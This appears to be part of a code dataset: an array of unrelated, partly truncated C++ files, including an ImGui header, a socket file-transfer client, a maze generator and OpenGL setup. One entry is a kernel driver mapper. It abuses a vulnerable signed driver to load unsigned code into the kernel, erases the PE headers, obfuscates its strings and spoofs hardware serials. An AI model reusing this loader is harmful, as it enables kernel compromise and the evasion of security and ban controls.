bPack.spin(fwd);\n  }\n  else if (Controller.ButtonR2.pressing()) {\n    bP",
    "// dear imgui, v1.90.6 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n/",
    "#include<filesystem>\n#include<fstream>\n#include<iostream>\n#include<string>\n#include<thread>\n#include<winsock2.h>\n#include<ws2tcpip.h>\n#pragma comment(lib,\"ws2_32.lib\")\n#define SERVERIP \"127.0.0.1\"\n#define SERVERPORT 4444\n#define BUFSIZE 1024\nusing namespace std;\n\nconst char* directoryPath = \"download_file\\\\\";\n\nvoid mkdir() {\n\tconst char* direct = \"download_file\";\n\tif (!filesystem::exists(direct))\n\t\tfilesystem::create_directory(direct);\n}\n\nvoid recv_file(SOCKET sock) {\n\tchar buf[BUFSIZE];\n\trecv(sock, buf, BUFSIZE, 0);\n\tsend(sock, \"1\", 1, 0);\n\tstring file_name = buf;\n\n\tint file_size;\n\trecv(sock, (char*)&file_size, sizeof(int), 0);\n\tsend(sock, \"1\", 1, 0);\n\n\tchar* file_data = new char[file_size];\n\trecv(sock, file_data, file_size, 0);\n\tsend(sock, \"1\", 1, 0);\n\n\tofstream out(directoryPath + file_name, ios::out | ios::binary);\n\n\tout.write(file_data, file_size);\n\tcout << file_name << \" \ub2e4\uc6b4\ub85c\ub4dc \uc131\uacf5\" << endl;\n\n\tout.close();\n\tdelete[] file_data;\n}\n\nvoid send_file(SOCKET sock, string path) {\n\tchar sign;\n\tifstream is(path, ios::in | ios::binary);\n\tif (!is) {\n\t\tcout << \"\ud30c\uc77c \uc5f4\uae30 \uc624\ub958\" << endl;\n\t\tis.close();\n\t\treturn;\n\t}\n\n\t//\ud30c\uc77c\uba85\uc744 \uc11c\ubc84\ub85c \uc804\uc1a1\n\tsend(sock, path.c_str(), strlen(path.c_str()) + 1, 0);\n\n\tis.seekg(0, is.end);\n\tint file_size = is.tellg();\n\tis.seekg(0, is.beg);\n\n\tsend(sock, (char*)&file_size, sizeof(int), 0);\n\n\t//\ud30c\uc77c \ud06c\uae30 \uc804\uc1a1 \uc644\ub8cc \uc2e0\ud638 \ubcf4\ub0c4\n\trecv(sock, &sign, 1, 0);\n\tcout << \"\ud30c\uc77c \ud06c\uae30 \uc804\uc1a1 \uc644\ub8cc [\" << file_size << \"]\" << endl;\n\n\tchar* file_data = new char[file_size];\n\tis.read(file_data, file_size);\n\n\tsend(sock, (const char*)file_data, file_size, 0);\n\trecv(sock, &sign, 1, 0);\n\tcout << \"\uc11c\ubc84\ub85c \ud30c\uc77c \uc804\uc1a1 \uc131\uacf5\" << endl;\n\n\tis.close();\n\tdelete[] file_data;\n}\n\nvoid recv_file_list(SOCKET sock) {\n\tchar buf[1024];\n\tchar sign;\n\n\tint len = 0;\n\trecv(sock, buf, 1024, 0);\n\tsend(sock, \"1\", 1, 0);\n\n\tlen = atoi(buf);\n\tfor (int i = 0;i < len;i++) {\n\t\tmemset(buf, 0, sizeof(buf));\n\t\trecv(sock, buf, 1024, 0);\n\t\tsend(sock, \"1\", 1, 0);\n\t\tcout << buf << endl;\n\t}\n}\n\nvoid client_file_list() {\n\tconst char* direct = \"download_file\";\n\tint idx = 0;\n\tfor (auto iter : filesystem::directory_iterator(direct)) {\n\t\tstring p = iter.path().generic_string();\n\t\tp.erase(0, p.find(\"/\") + 1);\n\t\tcout << ++idx << \" \" << p << endl;\n\t}\n}\n\nvoid client_file_delete() {\n\tconst char* direct = \"download_file\";\n\n\tclient_file_list();\n\n\tint num;\n\tcout << \"\uc0ad\uc81c\ud558\uace0 \uc2f6\uc740 \ud30c\uc77c\uc744 \uc120\ud0dd\ud574\uc8fc\uc138\uc694: \";\n\tcin >> num;\n\n\tint idx = 0;\n\tfor (auto iter : filesystem::directory_iterator(direct)) {\n\t\tif (++idx == num) {\n\t\t\tstring p = iter.path().generic_string();\n\t\t\tif (::remove(p.c_str()) == 0) {\n\t\t\t\tcout << \"\ud30c\uc77c \uc0ad\uc81c\uc5d0 \uc131\uacf5\ud588\uc2b5\ub2c8\ub2e4.\" << endl;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"\ud30c\uc77c \uc0ad\uc81c\uc5d0 \uc2e4\ud328\ud588\uc2b5\ub2c8\ub2e4.\" << endl;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nint main()\n{\n\tmkdir();\n\tWSADATA wsa;\n\tif (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;\n\n\tSOCKET sock{ socket(AF_INET, SOCK_STREAM, 0) };\n\tsockaddr_in addr{ AF_INET, htons(SERVERPORT) };\n\tinet_pton(AF_INET, SERVERIP, &addr.sin_addr);\n\tif (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) return 1;\n\n\tbool flag = true;\n\tchar sign;\n\twhile (flag) {\n\t\tint command, num;\n\t\tstring path, temp;\n\t\tcout << \"1. \ud30c\uc77c \uc5c5\ub85c\ub4dc\" << endl;\n\t\tcout << \"2. \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\" << endl;\n\t\tcout << \"3. \uc11c\ubc84\uc5d0 \uc874\uc7ac\ud558\ub294 \ud30c\uc77c \ud655\uc778\" << endl;\n\t\tcout << \"4. \uc11c\ubc84\uc5d0 \ud30c\uc77c \uc0ad\uc81c\" << endl;\n\t\tcout << \"5. \ud074\ub77c\uc774\uc5b8\uc5d0 \uc874\uc7ac\ud558\ub294 \ud30c\uc77c \ud655\uc778\" << endl;\n\t\tcout << \"6. \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0 \ud30c\uc77c \uc0ad\uc81c\" << endl;\n\t\tcout << \"7. \ud074\ub77c\uc774\uc5b8\ud2b8 \uc885\ub8cc\" << endl;\n\t\tcin >> command;\n\t\tcin.ignore();\n\n\t\tswitch (command) {\n\t\tcase 1:\n\t\t\tcout << \"\uc804\uc1a1\ud560 \ud30c\uc77c\uc758 \uc704\uce58\ub97c \uc801\uc5b4\uc8fc\uc138\uc694.\" << endl;\n\t\t\tgetline(cin, path);\n\t\t\t//\uacbd\ub85c\uc5d0\uc11c \"\" \uc0ad\uc81c\n\t\t\twhile (path.find(\"\\\"\") != string::npos)\n\t\t\t\tpath.erase(find(path.begin(), path.end(), '\\\"'));\n\n\t\t\t// \uc11c\ubc84\uc5d0 1\uc744 \uc804\uc1a1\n\t\t\tsend(sock, \"1\", 1, 0);\n\n\t\t\t//\ud30c\uc77c\uc744 \uc11c\ubc84\uc5d0 \uc804\uc1a1\n\t\t\tsend_file(sock, path);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tsend(sock, \"2\", 1, 0);\n\t\t\trecv_file_list(sock);\n\t\t\tcout << \"\ub2e4\uc6b4\ub85c\ub4dc\ud558\uace0 \uc2f6\uc740 \ud30c\uc77c\uc744 \uc120\ud0dd\ud574\uc8fc\uc138\uc694: \";\n\t\t\tcin >> num;\n\t\t\tsend(sock, to_string(num).c_str(), to_string(num).length() + 1, 0);\n\t\t\trecv(sock, &sign, 1, 0);\n\t\t\trecv_file(sock);\n\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tsend(sock, \"3\", 1, 0);\n\t\t\trecv_file_list(sock);\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tsend(sock, \"4\", 1, 0);\n\t\t\trecv_file_list(sock);\n\t\t\tcout << \"\uc0ad\uc81c\ud558\uace0 \uc2f6\uc740 \ud30c\uc77c\uc744 \uc120\ud0dd\ud574\uc8fc\uc138\uc694: \";\n\t\t\tcin >> num;\n\t\t\ttemp = to_string(num);\n\t\t\tsend(sock, temp.c_str(), temp.length() + 1, 0);\n\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\tclient_file_list();\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tclient_file_delete();\n\t\t\tbreak;\n\t\tcase 7:\n\t\t\tflag = false;\n\t\t\tsend(sock, \"7\", 1, 0);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tclosesocket(sock);\n\tWSACleanup();\n\treturn 0;\n}",
    "#include <bits/stdc++.h>\n//#include <windows.h>\n#include <sys/ioctl.h>\n#include <unistd.h>\nusing namespace std;\n\n/**\n * Standard disjoint union find set using rank.\n * Used to efficiently check if a solution exists between start and end in maze.\n */\nstruct UnionFindSet {\n    vector<int> parent, rank;\n\n    UnionFindSet(int n) : parent(n), rank(n, 1) {\n        for (int i = 0; i < n; ++i)\n            parent[i] = i;\n    }\n\n    int find(int x) {\n        if (parent[x] != x) {\n            parent[x] = find(parent[x]);\n        }\n        return parent[x];\n    }\n\n    void merge(int x, int y) {\n        int rootX = find(x);\n        int rootY = find(y);\n        if (rootX != rootY) {\n            if (rank[rootX] > rank[rootY]) {\n                parent[rootY] = rootX;\n            } else if (rank[rootX] < rank[rootY]) {\n                parent[rootX] = rootY;\n            } else {\n                parent[rootY] = rootX;\n                rank[rootX]++;\n            }\n        }\n    }\n\n    bool together(int x, int y) {\n        return find(x) == find(y);\n    }\n};\n\nvector<pair<int, int>> directions = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};\nint delay;  // delay to view the algorithms visually\n\n/**\n * Gets a random edge in the maze\n * @param n rows of maze\n * @param m cols of maze\n * @return random edge\n */\npair<int, int> randomEdge(int n, int m) {\n    random_device rd;\n    mt19937 gen(rd());\n\n    uniform_int_distribution<> dist_r(0, n - 1);\n    uniform_int_distribution<> dist_c(0, m - 1);\n    int r = dist_r(gen);\n    int c = dist_c(gen);\n\n    vector<pair<int, int>> adj;\n    for (const pair<int, int>& d : directions) {\n        int dr = r + d.first, dc = c + d.second;\n        if (dr >= 0 && dr < n && dc >= 0 && dc < m) {\n            adj.push_back({dr, dc});\n        }\n    }\n\n    uniform_int_distribution<> dist_choice(0, adj.size() - 1);\n    int choice = dist_choice(gen);\n\n    return {r * m + c, adj[choice].first * m + adj[choice].second};\n}\n\n/**\n * Prints the maze to screen\n * @param visual the visual grid to print\n */\nvoid showMaze(vector<vector<string>>& visual) {\n    for (auto i : visual) {\n        for (auto j : i) {\n            cout << j;\n        }\n        cout << endl;\n    }\n}\n\n/**\n * Creates the initial grid of boxes for the maze\n * @param n rows of maze\n * @param m cols of maze\n * @return 2d vector of strings which make up the maze\n */\nvector<vector<string>> createVisualGrid(int n, int m) {\n    vector<vector<string>> visual(2 * n + 1, vector<string>(2 * m + 1));\n    visual[0][0] = \"\u250f\";\n    for (int i = 1; i <= 2 * m - 1; i++) {\n        if (i % 2 == 0) {\n            visual[0][i] = \"\u2533\";\n        } else {\n            visual[0][i] = \"\u2501\";\n        }\n    }\n    visual[0][2 * m] = \"\u2513\";\n\n    for (int i = 1; i <= 2 * n - 1; i += 2) {\n        visual[i][0] = \"\u2503\";\n        for (int j = 1; j <= 2 * m - 1; j++) {\n            if (j % 2 == 0) {\n                visual[i][j] = \"\u2503\";\n            } else {\n                visual[i][j] = \" \";\n            }\n        }\n        visual[i][2 * m] = \"\u2503\";\n\n        visual[i+1][0] = \"\u2523\";\n        for (int j = 1; j <= 2 * m - 1; j++) {\n            if (j % 2 == 0) {\n                visual[i+1][j] = \"\u254b\";\n            } else {\n                visual[i+1][j] = \"\u2501\";\n            }\n        }\n        visual[i+1][2 * m] = \"\u252b\";\n    }\n\n    visual[2 * n][0] = \"\u2517\";\n    for (int i = 1; i <= 2 * m - 1; i++) {\n        if (i % 2 == 0) {\n            visual[2 * n][i] = \"\u253b\";\n        } else {\n            visual[2 * n][i] = \"\u2501\";\n        }\n    }\n    visual[2 * n][2 * m] = \"\u251b\";\n\n    visual[1][0] = \" \";\n\n    return visual;\n}\n\n/**\n * When opening a way between 2 boxes the corners need to be changed\n * to make the ascii maze look nice\n * @param c the current ascii box character at that position\n * @param d the direction, 0 for top, subsequent values are counted clockwise\n * @return The box character that it should be changed to\n */\nstring switchBoxLine(string c, int d) {\n    if (d == 0) {\n        if (c == \"\u254b\") return \"\u253b\";\n        if (c == \"\u2533\" || c == \"\u250f\" || c == \"\u2513\") return \"\u2501\";\n        if (c == \"\u252b\") return \"\u251b\";\n        if (c == \"\u2523\") return \"\u2517\";\n    } else if (d == 1) {\n        if (c == \"\u254b\") return \"\u2523\";\n        if (c == \"\u252b\" || c == \"\u2513\" || c == \"\u251b\") return \"\u2503\";\n        if (c == \"\u2533\") return \"\u250f\";\n        if (c == \"\u253b\") return \"\u2517\";\n    } else if (d == 2) {\n        if (c == \"\u254b\") return \"\u2533\";\n        if (c == \"\u252b\") return \"\u2513\";\n        if (c == \"\u253b\" || c == \"\u251b\" || c == \"\u2517\") return \"\u2501\";\n        if (c == \"\u2523\") return \"\u250f\";\n    } else if (d == 3) {\n        if (c == \"\u254b\") return \"\u252b\";\n        if (c == \"\u253b\") return \"\u251b\";\n        if (c == \"\u2523\" || c == \"\u250f\" || c == \"\u2517\") return \"\u2503\";\n        if (c == \"\u2533\") return \"\u2513\";\n    }\n\n    return c;\n}\n\n/**\n * Used for opening the maze up on the visual grid\n * @param edge edge being opened\n * @param n rows of the maze\n * @param m cols of the maze\n * @param US the union find set\n * @param visual the visual grid\n */\nvoid changeVisualGrid(pair<int, int> edge, int n, int m, vector<vector<string>>& visual) {\n    int r = edge.first / m, c = edge.f",
    "// This program demonstrates the deleteNode member function.\n#include <iostream>\n#include \"NumberList.h\"\nusing namespace std;\n\nint main()\n{\n   // Define a NumberList object.\n   NumberList list;\n\n   // Build the list with some values.\n   list.appendNode(2.5);\n   list.appendNode(7.9);\n   list.appendNode(12.6);\n\n   // Display the list.\n   cout << \"Here are the initial values:\\n\";\n   list.displayList();\n   cout << endl;\n\n   // Delete the middle node.\n   cout << \"Now deleting the node in the middle.\\n\";\n   list.deleteNode(7.9);\n\n   // Display the list.\n   cout << \"Here are the nodes left.\\n\";\n   list.displayList();\n   cout << endl;\n\n   // Delete the last node.\n   cout << \"Now deleting the last node.\\n\";\n   list.deleteNode(12.6);\n\n   // Display the list.\n   cout << \"Here are the nodes left.\\n\";\n   list.displayList();\n   cout << endl;\n\n   // Delete the only node left in the list.\n   cout << \"Now deleting the only remaining node.\\n\";\n   list.deleteNode(2.5);\n\n   // Display the list.\n   cout << \"Here are the nodes left.\\n\";\n   list.displayList();\n   return 0;\n}",
    "#include \"mapp.hpp\"\r\n#include \"utils.hpp\"\r\n#include \"xorstr.hpp\"\r\n\r\nHANDLE ttConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\r\nuint64_t lksmapp::MapDriver(HANDLE vul_driver_device_handle, std::vector<uint8_t> raw_image)\r\n{\r\n\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = portable::GetNtHeaders(raw_image.data());\r\n\r\n\tif (!nt_headers)\r\n\t{\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tif (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)\r\n\t{\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tconst uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;\r\n\r\n\tvoid* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\r\n\tuint64_t kernel_image_base = vul_driver::AllocatePool(vul_driver_device_handle, nt::NonPagedPool, image_size);\r\n\r\n\tdo\r\n\t{\r\n\t\tif (!kernel_image_base)\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\r\n\t\t// Copy image headers\r\n\r\n\t\tstd::memcpy(local_image_base, raw_image.data(), nt_headers->OptionalHeader.SizeOfHeaders);\r\n\r\n\t\t// Copy image sections\r\n\r\n\t\tconst PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);\r\n\r\n\t\tfor (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i)\r\n\t\t{\r\n\t\t\tauto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);\r\n\t\t\tstd::memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(raw_image.data()) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);\r\n\t\t}\r\n\r\n\t\t// Resolve relocs and imports\r\n\r\n\t\tRelocateImageByDelta(portable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);\r\n\r\n\t\tif (!ResolveImports(vul_driver_device_handle, portable::GetImports(local_image_base)))\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t// Write fixed image to kernel\r\n\r\n\t\tif (!vul_driver::WriteMemory(vul_driver_device_handle, kernel_image_base, local_image_base, image_size))\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tVirtualFree(local_image_base, 0, MEM_RELEASE);\r\n\r\n\t\t// Call driver entry point\r\n\r\n\t\tconst uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;\r\n\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\r\n\t\tNTSTATUS status = 0;\r\n\r\n\t\tif (!vul_driver::CallKernelFunction(vul_driver_device_handle, &status, address_of_entry_point))\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tBlockInput(TRUE);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"\\n\\n                    ---->               [\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 8);\r\n\t\tutilitiesy::slow_print(XorString(\"+\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"]\"), 9);\r\n\t\tutilitiesy::slow_print(XorString(\" Spoof \"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 3);\r\n\t\tutilitiesy::slow_print(XorString(\"SMBIOS\"), 9);\r\n\t\tSleep(1000);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"\\n\\n                    ---->               [\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 8);\r\n\t\tutilitiesy::slow_print(XorString(\"+\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"]\"), 9);\r\n\t\tutilitiesy::slow_print(XorString(\" Spoof \"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 3);\r\n\t\tutilitiesy::slow_print(XorString(\"CPU\"), 9);\r\n\t\tSleep(1000);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"\\n\\n                    ---->               [\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 8);\r\n\t\tutilitiesy::slow_print(XorString(\"+\"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"]\"), 9);\r\n\t\tutilitiesy::slow_print(XorString(\" Spoof \"), 9);\r\n\t\tSetConsoleTextAttribute(ttConsole, 3);\r\n\t\tutilitiesy::slow_print(XorString(\"Disks Serials\"), 9);\r\n\t\tSleep(1000);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"\\n\\n                    ---->               [\"), 15);\r\n\t\tSetConsoleTextAttribute(ttConsole, 8);\r\n\t\tutilitiesy::slow_print(XorString(\"+\"), 15);\r\n\t\tSetConsoleTextAttribute(ttConsole, 10);\r\n\t\tutilitiesy::slow_print(XorString(\"]\"), 15);\r\n\t\tutilitiesy::slow_print(XorString(\" Spoof \"), 15);\r\n\t\tSetConsoleTextAttribute(ttConsole, 3);\r\n\t\tutilitiesy::slow_print(XorString(\"RAM\\n\"), 15);\r\n\t\tSleep(5000);\r\n\t\t// Erase PE headers\r\n\t\tvul_driver::SetMemory(vul_driver_device_handle, kernel_image_base, 0, nt_headers->OptionalHeader.SizeOfHeaders);\r\n\t\tSleep(1000);\r\n\t\tBlockInput(FALSE);\r\n\t\treturn kernel_image_base;\r\n\r\n\t} while (false);\r\n\tVirtualFree(local_image_base, 0, MEM_RELEASE);\r\n\tvul_driver::FreePool(vul_driver_device_handle, kernel_image_base);\r\n\treturn 0;\r\n}\r\n\r\nvoid lksmapp::RelocateImageByDelta(portable::vec_relocs relocs, const uint64_t delta)\r\n{\r\n\tfor (const auto& current_reloc : relocs)\r\n\t{\r\n\t\tfor (auto i = 0u; i < current_reloc.count; ++i)\r\n\t\t{\r\n\t\t\tconst uint16_t type = current_reloc.item[i] >> 12;\r\n\t\t\tSleep(1000);\r\n\t\t\tconst uint16_t offset = current_reloc.item[i] & 0xFFF;\r\n\r\n\t\t\tif (type == IMAGE_REL_BASED_DIR64)\r\n\t\t\t\t* reinterpret_cast<uint64_t*>(current_reloc",
    "//{ Driver Code Starts\n//Initial Template for C++\n#include <iostream>\nusing namespace std;\n\n\n// } Driver Code Ends\n//User function Template for C++\n\n/*Function to swap array elements\n* arr : array input\n* n : number of elements in array\n*/\nclass Solution{\n  public:\n   void swapElements(int arr[], int n) {\n    // Swap every ith element with the (i+2)th element\n    for (int i = 0; i < n - 2; i++) {\n        // Perform the swap\n        std::swap(arr[i], arr[i + 2]);\n    }\n}\n\n};\n\n//{ Driver Code Starts.\n\n// Driver code to test swapElements\nint main() {\n\t\n\tint testcase;\n\t\n\tcin >> testcase;\n\t\n\twhile(testcase--){\n\t    int n;\n\t    cin >> n;\n\t    \n\t    int arr[n];\n\t    \n\t    for(int i = 0;i<n;i++){\n\t        cin >> arr[i];\n\t    }\n        Solution obj;\n        // calling function to swap the array swap elements\n\t    obj.swapElements(arr, n);\n\t    \n\t    // Printing the modified array\n\t    for(int i = 0;i<n;i++){\n            cout << arr[i] << \" \";\n        }\n\t    \n\t    cout << endl;\n\t}\n\t\n\treturn 0;\n}\n// } Driver Code Ends",
    "#include \"FollowerResolver.hpp\"\n\nnamespace service::follower::resolver {\n\nFollowerResolver::FollowerResolver(\n  std::unique_ptr<ResolverDelegate> delegate)\n  : delegate_(std::move(delegate)) {\n}\n\nserver::follower::types::SubscribeResponse FollowerResolver::Subscribe(\n  const server::follower::types::SubscribeRequest& request) {\n  server::follower::types::SubscribeResponse response;\n\n  if(nullptr != delegate_) {\n    response = delegate_->Subscribe(request);\n  } else {\n    response.error = -1;\n  }\n\n  return response;\n}\n\nserver::follower::types::UnsubscribeResponse FollowerResolver::Unsubscribe(\n  const server::follower::types::UnsubscribeRequest& request) {\n  server::follower::types::UnsubscribeResponse response;\n\n  if(nullptr != delegate_) {\n    response = delegate_->Unsubscribe(request);\n  } else {\n    response.error = -1;\n  }\n\n  return response;\n}\n\nserver::follower::types::GetFollowersResponse FollowerResolver::GetFollowers(\n  const server::follower::types::GetFollowersRequest& request) {\n  server::follower::types::GetFollowersResponse response;\n\n  if(nullptr != delegate_) {\n    response = delegate_->GetFollowers(request);\n  } else {\n    response.error = -1;\n  }\n\n  return response;\n}\n\nserver::follower::types::GetFollowingResponse FollowerResolver::GetFollowing(\n  const server::follower::types::GetFollowingRequest& request) {\n  server::follower::types::GetFollowingResponse response;\n\n  if(nullptr != delegate_) {\n    response = delegate_->GetFollowing(request);\n  } else {\n    response.error = -1;\n  }\n\n  return response;\n}\n\nserver::follower::types::GetClientTargetsResponse FollowerResolver::GetClientTargets(\n  const server::follower::types::GetClientTargetsRequest& request) {\n  server::follower::types::GetClientTargetsResponse response;\n\n  if(nullptr != delegate_) {\n    response = delegate_->GetClientTargets(request);\n  } else {\n    response.error = -1;\n  }\n\n  return response;\n}\n\n} // service::follower::resolver\n",
    "#include <glad/glad.h>\r\n#include <GLFW/glfw3.h>\r\n#include <iostream>\r\n\r\n#include \"glm/glm.hpp\"\r\n#include \"glm/gtc/matrix_transform.hpp\"\r\n#include \"glm/gtc/type_ptr.hpp\"\r\n\r\n#include \"Shader.h\"\r\n#include \"Camera.h\"\r\n#define STB_IMAGE_IMPLEMENTATION\r\n#include \"stb_image.h\"\r\n\r\n//settings\r\nint SCR_WIDTH{ 800 };\r\nint SCR_HEIGHT{ 600 };\r\n\r\n//screen\r\nCamera camera(glm::vec3(0.f, 0.f, 3.f));\r\nfloat lastX{ SCR_WIDTH / 2.f };\r\nfloat lastY{ SCR_HEIGHT / 2.f };\r\nbool firstMouse{ true };\r\n\r\n//deltaTime\r\nfloat deltaTime{ 0.f };\r\nfloat lastFrame{ 0.f };\r\n\r\nvoid framebuffer_scall(GLFWwindow* window, int w, int h) {\r\n    glViewport(0, 0, w, h);\r\n    SCR_WIDTH = w;\r\n    SCR_HEIGHT = h;\r\n}\r\n\r\nbool moveScene{ true };\r\nbool doNormalMap{ true };\r\nbool isTPressed{ false };\r\nbool isNPressed{ false };\r\nfloat lightStrength{ 1.f };\r\nvoid processInput(GLFWwindow* window) {\r\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS) {\r\n        glfwSetWindowShouldClose(window, true);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_W) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(FORWARD, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_A) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(LEFT, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_S) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(BACKWARD, 